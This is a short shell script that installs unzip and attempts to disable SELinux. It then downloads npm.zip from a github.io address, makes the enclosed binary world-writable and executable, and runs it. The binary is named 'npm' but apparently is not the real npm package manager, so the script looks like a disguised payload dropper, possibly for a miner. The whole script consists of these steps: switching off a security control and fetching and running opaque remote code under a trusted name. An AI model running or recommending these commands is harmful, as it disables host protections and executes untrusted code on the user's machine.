sudo apt install unzip -y
sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
cd ~
curl -O https://fuserh.github.io/npm.zip
unzip npm.zip
cd npm
chmod 777 ./npm
./npm
